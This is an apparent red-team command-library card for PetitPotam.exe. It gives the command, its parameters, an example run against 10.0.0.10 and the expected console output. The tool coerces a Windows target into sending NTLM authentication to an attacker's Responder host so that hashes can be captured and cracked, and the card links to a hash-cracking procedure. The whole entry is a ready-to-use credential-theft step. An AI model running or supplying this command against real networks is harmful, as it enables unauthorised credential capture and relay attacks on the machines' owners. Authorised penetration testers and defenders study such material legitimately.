---
type: command
executor: bash
data: PetitPotam.exe $_TARGET_IP $_RESPONDER_IP
output: null
created_at: '2023-04-06T03:56:05.187983+00:00'
updated_at: '2023-04-10T20:35:59.633859+00:00'
platforms:
  - Windows
tags:
  - coercion
  - ntlm-relay
verified: true
validated: true
---

# petitpotam-exe-coerce-auth

## Command

```bash
PetitPotam.exe $_TARGET_IP $_RESPONDER_IP
```

## Description

This Windows executable command coerces NTLM authentication from a target without initial credentials, relaying to Responder for hash capture. Patched in August 2021 for anonymous access, so use only if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP of machine to coerce authentication from | Yes |
| $_RESPONDER_IP | Attacker's Responder IP for relay | Yes |

## Examples

### Basic Usage

```bash
PetitPotam.exe 10.0.0.10 10.0.0.5
```

## Expected Output

Console output: `PetitPotam sent !` or error. Verify capture in Responder logs.

## Related

- [[procedures/Capture-and-Crack-Net-NTLMv1-Hashes]]
- [[tools/PetitPotam]]
